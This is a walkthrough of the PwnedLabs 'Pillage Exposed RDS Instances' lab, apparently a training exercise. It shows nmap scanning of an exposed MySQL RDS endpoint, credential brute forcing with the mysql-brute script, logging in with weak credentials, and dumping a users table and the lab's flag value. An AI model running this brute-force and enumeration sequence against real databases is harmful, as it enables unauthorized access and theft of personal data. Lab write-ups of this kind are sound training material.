---
title: "Pillage Exposed RDS Instances @ PwnedLabs"
date: 2026-07-09
categories: [PwnedLabs, Cloud]
tags: [aws, rds, cloud-security]
image:
  path: /assets/pwn.png
---


**Platform:** [PwnedLabs](https://pwnedlabs.io)  
**Lab:** [Pillage Exposed RDS Instances](https://pwnedlabs.io/labs/pillage-exposed-rds-instances)  
**Difficulty:** Beginner

## Scenario

In the backdrop of rising cybersecurity threats, with chatter on Telegram channels hinting at data dumps and Pastebin snippets exposing configuration snippets, Huge Logistics is taking no chances. They've enlisted our team to rigorously assess their cloud infrastructure. Armed with a list of IP addresses and endpoints, a lead emerged, an RDS endpoint: `exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com`. The mission is to dive deep into this endpoint's security and identify any issues before threat actors do.

## What is Amazon RDS?

Amazon Relational Database Service (RDS) is a web service that handles the easy setup, operation, and scaling of relational databases in the cloud.
Hardware provisioning, database setup, patching, and backups are all managed by AWS, leaving teams free to focus at the application level.

Amazon RDS supports several database instances including:

1. Amazon Aurora (port 3306)
2. PostgreSQL (5432)
3. MySQL (port 3306)
4. MariaDB (port 3306)
5. Oracle Database (port 1521)
6. SQL Server (port 1433)

Brute force attacks on exposed infrastructure are very common, and publicly reachable RDS instances are no exception. Databases frequently contain highly sensitive data, making them an attractive target. While default account lockout policies can blunt noisy brute force attempts, a more careful attacker using multiple IP addresses and a small set of common credentials over a longer period can still get through. Beyond brute force, exposed database infrastructure is also open to denial of service attacks. Relying on a single layer of defense(application-layer security alone) is never enough to protect sensitive data.

## Enumeration

### Nmap

I started with a basic scan against the RDS endpoint to confirm what was actually listening.

```bash
~> /pwned/ebs nmap exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com -Pn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 13:49 +0100
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.054s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
3306/tcp open  mysql
```

Two ports came back, SMTP on 25 and MySQL on 3306. The MySQL port being open on a public-facing RDS endpoint is very bad. RDS instances should never be reachable from the internet without a security group restricting access to known IP ranges; this one had no such restriction.
I tried connecting to port 3306 directly with netcat to confirm the service was responding.

<img width="1096" height="149" alt="image" src="https://github.com/user-attachments/assets/3668fe4a-7865-469d-b7f8-34348b420e7b" />

The server responded with a MySQL handshake banner. No authentication bypass needed at the network level, it was just open.

---

## Credential Brute Force

### Nmap mysql-brute Script

With the port confirmed reachable, I got a credential list with common MySQL usernames and weak passwords from seclists, then ran nmap's `mysql-brute` NSE script against it with a delay to keep things from being too noisy.

```bash
~> /pwned/ebs nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 14:04 +0100
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.16s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute: 
|   Accounts: 
|     dbuser:123 - Valid credentials
|_  Statistics: Performed 23 guesses in 32 seconds, average tps: 0.9

Nmap done: 1 IP address (1 host up) scanned in 35.71 seconds
```

After twenty-three guesses in 32 seconds, it was done and I got valid creds.

`dbuser : 123`

A database exposed to the internet, protected by a three-character numeric password, LOL.

---

## Database Enumeration

### Connecting

```bash
~> /pwned/ebs mysql -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com --skip-ssl -u dbuser -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 508071
Server version: 8.0.42 Source distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

I used the `--skip-ssl` flag to disable certificate verfication.

### Mapping the Databases

First thing after landing in a MySQL shell is always `show databases` to get
a picture of what's hosted here.

```sql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| user_info          |
+--------------------+
3 rows in set (0.393 sec)

MySQL [(none)]> use user_info
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [user_info]>
```

Three databases returned. `information_schema` and `performance_schema` are MySQL default databases. `user_info` is the only
application database, so that's where we're going.

```sql
MySQL [user_info]> show tables;
+---------------------+
| Tables_in_user_info |
+---------------------+
| flag                |
| users               |
+---------------------+
2 rows in set (0.436 sec)

MySQL [user_info]>
```

### What's Actually in Here

```sql
MySQL [user_info]> select * from users;
```

<img width="1237" height="577" alt="image" src="https://github.com/user-attachments/assets/65c0d1c3-dbc9-43e6-9207-9610c68c82d6" />


This is bad. The `users` table is a complete PII dump full names, email addresses, passwords, IP addresses, and credit card numbers, all sitting in a database that any internet user with a port scanner and a wordlist can reach in under a minute. The `password` column stores what appear to be hashed values, but the credit card numbers are plaintext.

The attack surface here goes beyond just reading data. With `dbuser` having write permissions, an attacker could also modify records, silently changing email addresses, passwords, or billing information.

### Flag

```sql
MySQL [user_info]> select * from flag;
+----------------------------------+
| flag                             |
+----------------------------------+
| e1c342d58b6933b3e0b5078174fd5a62 |
+----------------------------------+
1 row in set (0.579 sec)
```
